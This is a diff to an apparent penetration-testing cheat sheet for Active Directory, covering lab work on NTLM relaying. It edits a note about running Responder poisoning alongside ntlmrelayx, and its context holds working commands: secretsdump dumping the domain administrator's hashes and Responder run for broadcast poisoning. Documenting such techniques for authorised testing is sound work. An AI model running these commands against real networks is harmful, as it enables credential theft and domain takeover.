@@ -13,7 +13,7 @@
  - Run secretsdump on domain administrator:   
    `secretsdump.py winlab.csnc.ch/hostname$@dc.winlab.csnc.ch -just-dc -just-dc-user Administrator`   
    
- Note: For the poisoning, run Responder at the same time, but with SMB and HTTP server disabled for Responder:   
+ Note: For the poisoning of broadcast messages, run Responder at the same time, but with SMB and HTTP server disabled for Responder. This is not required if you do targeted relaying where you trigger the victims connection to your ntlmrelayx host.   
  - Start Responder.py with SMB and HTTP disabled: (disable them in /root/vkoch/Responder/Responder.conf)   
    `sudo /opt/Responder/Responder.py -I eth1 -w -r -f -d`   
 
